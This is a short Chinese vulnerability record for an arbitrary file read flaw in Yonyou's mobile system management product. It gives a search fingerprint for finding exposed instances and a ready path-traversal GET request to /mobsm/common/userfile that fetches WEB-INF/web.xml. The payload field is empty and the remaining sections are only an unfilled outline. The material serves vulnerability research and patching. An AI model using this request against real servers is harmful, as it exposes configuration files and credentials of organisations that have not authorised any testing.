# 用友移动管理系统userfile存在任意文件读取漏洞

- **系统**：用友　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app="用友-移动系统管理"`
- **请求**：`GET /mobsm/common/userfile?path=%5C..%5Cwebapps%5Cnc_web%5CWEB-INF%5Cweb.xml HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`

**请求体 / payload**
```

```

**其他**
- 用友移动管理系统userfile存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友移动系统管理系统